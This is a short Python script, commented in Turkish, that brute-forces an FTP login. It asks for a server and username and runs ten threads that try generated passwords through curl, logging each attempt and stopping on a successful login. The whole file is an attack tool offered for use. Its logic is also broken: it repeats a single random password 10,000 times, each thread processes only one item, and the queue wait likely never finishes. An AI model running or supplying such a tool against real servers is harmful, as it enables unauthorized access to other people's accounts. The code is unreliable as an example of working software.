import os
import subprocess
import threading
import queue

# Kullanıcıdan input al
server = input("FTP Sunucusu: ")
user = input("Kullanıcı adı: ")

# Log dosyası
log_file = "bruteforce.log"

# Log dosyasını temizle
with open(log_file, 'w'):
    pass

# Rastgele parola oluşturma fonksiyonu
def generate_passwords():
    result = subprocess.run(['openssl', 'rand', '-base64', '10'], capture_output=True, text=True)
    return [result.stdout.strip() for _ in range(10000)]

# Parola listesini oluştur
pass_list = generate_passwords()

# Log işlemi
def log_message(message):
    print(message)
    with open(log_file, 'a') as f:
        f.write(message + "\n")

# Paralel brute force saldırısı
def check_password(password, q):
    log_message(f"Trying {user}:{password}")
    response = subprocess.run(['curl', '-s', '--user', f"{user}:{password}", f"ftp://{server}"], capture_output=True, text=True)
    if "230" in response.stdout:
        log_message(f"Login successful: {user}:{password}")
        os._exit(0)
    q.task_done()

# Parola listesi için kuyruk oluştur
q = queue.Queue()

# Parolaları kuyruğa ekle
for password in pass_list:
    q.put(password)

# İş parçacıklarını başlat
threads = []
for _ in range(10):
    t = threading.Thread(target=lambda q: q.put(check_password(q.get(), q)), args=(q,))
    t.start()
    threads.append(t)

# Kuyruğun tamamlanmasını bekle
q.join()

log_message("Brute force attack finished.")
exit(1)